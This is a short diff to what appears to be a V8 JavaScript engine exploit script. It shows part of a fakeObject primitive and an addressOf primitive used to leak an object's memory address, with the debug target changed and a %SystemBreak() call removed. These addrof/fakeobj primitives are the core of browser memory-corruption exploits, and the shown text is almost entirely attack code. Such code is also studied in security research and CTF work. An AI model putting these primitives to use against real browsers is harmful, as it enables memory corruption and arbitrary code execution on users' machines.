@@ -42,7 +42,6 @@ function fakeObject(addr_to_fake)
     return faked_obj;
 }
 var test_obj = {};
-%DebugPrint(test_obj);
-var test_obj_addr = f2i(addressOf(test_obj));
+%DebugPrint(addressOf);
+var test_obj_addr = f2i(addressOf(addressOf));
 console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
-%SystemBreak();
